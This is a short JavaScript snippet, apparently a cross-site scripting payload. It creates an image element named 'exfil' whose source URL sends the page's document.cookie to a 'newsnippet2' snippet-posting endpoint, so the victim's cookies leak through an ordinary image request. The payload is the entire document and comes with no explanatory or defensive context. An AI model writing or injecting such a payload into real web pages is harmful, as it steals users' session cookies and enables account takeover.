//jshint browser:true
var exfil = document.createElement("img");
exfil.src = "newsnippet2?snippet="+document.cookie;
document.appendChild(exfil);
